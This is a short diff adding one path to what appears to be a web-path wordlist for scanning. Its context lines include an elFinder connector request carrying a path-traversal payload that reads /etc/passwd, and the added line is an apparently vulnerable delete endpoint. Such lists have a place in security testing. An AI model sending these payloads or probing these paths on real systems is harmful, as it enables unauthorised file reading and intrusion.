@@ -9709,3 +9709,4 @@ a
 /2rGP9KEwji2pniXwi2IRTH0couS.txt
 /js/filemanager/api/index.php
 /elfinder/php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64>&download=1
+/classes/Master.php?f=delete_item
